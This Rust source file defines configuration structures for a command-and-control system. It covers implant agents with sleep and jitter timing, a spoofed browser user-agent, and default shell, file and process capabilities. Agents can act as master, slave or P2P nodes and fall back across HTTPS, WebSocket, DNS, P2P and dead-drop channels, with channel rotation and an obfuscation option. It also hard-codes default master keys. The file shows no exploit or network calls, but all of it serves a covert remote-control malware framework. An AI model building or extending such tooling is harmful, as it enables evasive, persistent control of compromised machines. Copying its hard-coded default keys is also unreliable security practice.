//! Configuration for C2 system.

use serde::{Deserialize, Serialize};
use std::time::Duration;
use std::net::SocketAddr;

/// Main C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Config {
    pub agent: AgentConfig,
    pub server: ServerConfig,
    pub channels: ChannelConfig,
    pub crypto: CryptoConfig,
    pub transport: TransportConfig,
}

impl Default for C2Config {
    fn default() -> Self {
        Self {
            agent: AgentConfig::default(),
            server: ServerConfig::default(),
            channels: ChannelConfig::default(),
            crypto: CryptoConfig::default(),
            transport: TransportConfig::default(),
        }
    }
}

/// Agent configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub id: Option<String>,
    pub name: String,
    pub sleep_interval: u64, // milliseconds
    pub jitter: f32, // 0.0 to 1.0
    pub check_interval: u64, // milliseconds between channel checks
    pub max_retries: u32,
    pub retry_delay: u64, // milliseconds
    pub capabilities: Vec<String>,
    pub user_agent: String,
    pub headers: Vec<(String, String)>,
    pub dns_resolver: Option<String>,
    pub proxy: Option<ProxyConfig>,
    // Role configuration
    pub role: String, // "master", "slave", "node", or "hybrid"
    pub master_server: Option<String>, // If slave, the master server URL
    pub node_id: Option<String>, // P2P node identifier
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            id: None,
            name: "agent".to_string(),
            sleep_interval: 60000, // 1 minute
            jitter: 0.2,
            check_interval: 5000, // 5 seconds
            max_retries: 3,
            retry_delay: 1000,
            capabilities: vec!["shell".to_string(), "file".to_string(), "process".to_string()],
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            headers: vec![],
            dns_resolver: None,
            proxy: None,
            role: "hybrid".to_string(),
            master_server: None,
            node_id: None,
        }
    }
}

/// Server configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServerConfig {
    pub bind_address: SocketAddr,
    pub external_address: Option<String>,
    pub tls_cert: Option<String>,
    pub tls_key: Option<String>,
    pub master_key: String,
    pub database_url: String,
    pub log_level: String,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind_address: "0.0.0.0:8080".parse().unwrap(),
            external_address: None,
            tls_cert: None,
            tls_key: None,
            master_key: "default_master_key_change_me".to_string(),
            database_url: "sqlite:///c2.db".to_string(),
            log_level: "info".to_string(),
        }
    }
}

/// Channel configuration with failover priorities
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChannelConfig {
    /// HTTP/S channels (primary)
    pub https: Vec<HttpsChannel>,
    /// WebSocket channels
    pub websocket: Vec<WebSocketChannel>,
    /// DNS C2 channels
    pub dns: Vec<DnsChannel>,
    /// P2P configuration
    pub p2p: Option<P2PConfig>,
    /// Dead drop locations
    pub dead_drops: Vec<DeadDropConfig>,
    /// Channel rotation interval (seconds)
    pub rotation_interval: u64,
    /// Failover timeout (milliseconds)
    pub failover_timeout: u64,
}

impl Default for ChannelConfig {
    fn default() -> Self {
        Self {
            https: vec![],
            websocket: vec![],
            dns: vec![],
            p2p: Some(P2PConfig::default()),
            dead_drops: vec![],
            rotation_interval: 3600, // 1 hour
            failover_timeout: 10000, // 10 seconds
        }
    }
}

/// HTTPS channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpsChannel {
    pub url: String,
    pub method: String, // GET or POST
    pub path: String,
    pub headers: Vec<(String, String)>,
    pub body_template: Option<String>,
    pub priority: u8,
    pub enabled: bool,
}

/// WebSocket channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebSocketChannel {
    pub url: String,
    pub protocols: Vec<String>,
    pub headers: Vec<(String, String)>,
    pub ping_interval: Option<u64>,
    pub priority: u8,
    pub enabled: bool,
}

/// DNS C2 channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsChannel {
    pub domain: String,
    pub record_type: String, // TXT, NULL, CNAME
    pub subdomain: String,
    pub resolver: Option<String>,
    pub query_interval: u64,
    pub priority: u8,
    pub enabled: bool,
}

/// P2P network configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct P2PConfig {
    pub enabled: bool,
    pub listen_address: Option<SocketAddr>,
    pub bootstrap_nodes: Vec<String>,
    pub agent_public_key: Option<String>,
    pub known_servers: Vec<String>,
    pub use_mdns: bool,
    pub use_quic: bool,
    pub max_peers: u32,
}

impl Default for P2PConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            listen_address: Some("[::]:0".parse().unwrap()),
            bootstrap_nodes: vec![],
            agent_public_key: None,
            known_servers: vec![],
            use_mdns: true,
            use_quic: true,
            max_peers: 256,
        }
    }
}

/// Dead drop configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeadDropConfig {
    pub url: String,
    pub filename: String,
    pub check_interval: u64,
    pub auth_token: Option<String>,
    pub priority: u8,
    pub enabled: bool,
}

/// Cryptographic configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CryptoConfig {
    pub algorithm: String, // aes-256-gcm, chacha20-poly1305
    pub key_derivation: String, // hkdf-sha256
    pub master_key: String,
    pub session_timeout: u64, // seconds
    pub key_rotation_interval: u64, // seconds
}

impl Default for CryptoConfig {
    fn default() -> Self {
        Self {
            algorithm: "aes-256-gcm".to_string(),
            key_derivation: "hkdf-sha256".to_string(),
            master_key: "default_master_key".to_string(),
            session_timeout: 3600,
            key_rotation_interval: 86400, // 24 hours
        }
    }
}

/// Transport configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TransportConfig {
    pub timeout: Duration,
    pub connection_timeout: Duration,
    pub max_concurrent: u32,
    pub keep_alive: Option<Duration>,
    pub compress: bool,
    pub obfuscate: bool,
}

impl Default for TransportConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(30),
            connection_timeout: Duration::from_secs(10),
            max_concurrent: 4,
            keep_alive: Some(Duration::from_secs(60)),
            compress: true,
            obfuscate: false,
        }
    }
}

/// Proxy configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyConfig {
    pub scheme: String, // http, https, socks4, socks5
    pub host: String,
    pub port: u16,
    pub username: Option<String>,
    pub password: Option<String>,
}
